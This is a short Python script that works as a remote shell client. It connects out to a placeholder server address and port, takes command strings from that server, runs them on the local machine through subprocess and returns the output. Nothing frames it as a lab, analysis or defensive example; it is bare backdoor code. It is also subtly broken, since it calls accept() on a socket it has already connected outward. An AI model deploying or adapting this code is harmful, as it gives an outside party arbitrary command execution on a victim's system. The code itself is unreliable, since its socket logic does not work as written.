#!/usr/bin/python3

import socket
import subprocess
import os
import random

def get_random_port():
    return random.randint(49152, 65535)

def get_client_ip():
    # Get the client's IP address using a simple socket connection to a public server
    # Replace "8.8.8.8" with any public server IP you trust for this purpose
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.connect(("8.8.8.8", 80))
    client_ip = client_socket.getsockname()[0]
    client_socket.close()
    return client_ip

def execute_command(command):
    try:
        if os.name == 'nt':
            # Windows-specific handling
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output, error_output = process.communicate()
            output = output.decode("utf-8")
            error_output = error_output.decode("utf-8")
        else:
            # Linux handling
            process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = process.stdout.decode("utf-8")
            error_output = process.stderr.decode("utf-8")

        if output:
            return output.strip()
        elif error_output:
            return error_output.strip()
        else:
            return "Command executed successfully with no output."
    except Exception as e:
        return str(e)

def start_client():
    client_port = get_random_port()
    client_ip = get_client_ip()
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.bind(("", client_port))
        client_socket.connect(("SERVER_IP_ADDRESS", SERVER_PORT)) # Replace SERVER_IP_ADDRESS with your server's IP address
        print(f"Connected to server. Client IP: {client_ip}, Client port: {client_port}")

        while True:
            conn, addr = client_socket.accept()
            with conn:
                data = conn.recv(4096).decode()
                if not data:
                    break

                command = data.split()
                if not command:
                    continue

                # Execute the command and get the result
                result = execute_command(command)

                # Send the result back to the server
                conn.send(result.encode())

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    SERVER_PORT = 12345  # Replace with the actual port your server is running on
    start_client()

